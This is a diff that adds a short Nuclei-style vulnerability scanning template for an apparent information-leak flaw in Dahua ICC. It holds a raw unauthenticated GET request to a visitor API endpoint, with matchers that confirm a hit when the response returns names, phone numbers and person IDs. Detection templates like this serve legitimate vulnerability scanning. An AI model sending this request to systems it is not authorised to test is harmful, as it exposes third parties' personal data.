@@ -1,0 +1,20 @@
+id: Dahua-ICC-user-infoleak
+ 
+info:
+  name: Dahua-ICC-user-infoleak
+  author: Dahua
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /evo-apigw/evo-visitor/1.0.0/card/visitor/user/info?userId=4&pageNum=1&pageSize=100 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Accept-Encoding: gzip
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"name","phone","personId")'
+          - 'status_code==200 && contains(body,"该用户未绑定平台人员")'
